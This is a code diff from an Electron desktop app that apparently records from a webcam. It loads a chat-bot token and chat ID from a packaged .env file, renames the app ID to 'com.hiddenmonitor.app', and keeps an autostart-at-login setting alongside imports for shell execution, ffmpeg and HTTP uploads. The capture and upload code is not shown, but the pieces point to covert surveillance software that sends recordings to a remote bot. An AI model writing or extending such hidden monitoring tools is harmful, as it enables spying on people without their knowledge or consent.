@@ -1,8 +1,3 @@
-require('dotenv').config();
-
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
-
 const { app, BrowserWindow, session, Tray, Menu, ipcMain } = require('electron');
 const path = require('path');
 const fs = require('fs');
@@ -10,6 +5,15 @@ const { exec } = require("child_process");
 const os = require("os");
 const axios = require("axios");
 const FormData = require("form-data");
+
+require("dotenv").config({
+  path: app.isPackaged
+    ? path.join(process.resourcesPath, ".env")
+    : path.join(__dirname,"..", ".env")
+});
+
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
 let ffmpegPath;
 
@@ -136,7 +140,7 @@ function createWindow() {
 
 app.whenReady().then(() => {
 
-  app.setAppUserModelId("com.webcam.app");
+  app.setAppUserModelId("com.hiddenmonitor.app");
 
   app.setLoginItemSettings({
     openAtLogin: true,
@@ -185,9 +189,9 @@ app.whenReady().then(() => {
     let iconPath;
 
     if (app.isPackaged) {
-      iconPath = path.join(process.resourcesPath, 'public', 'trayicon.ico');
+      iconPath = path.join(process.resourcesPath, 'public', 'icon.ico');
     } else {
-      iconPath = path.join(__dirname, '..', 'public', 'trayicon.ico');
+      iconPath = path.join(__dirname, '..', 'public', 'icon.ico');
     }
 
 
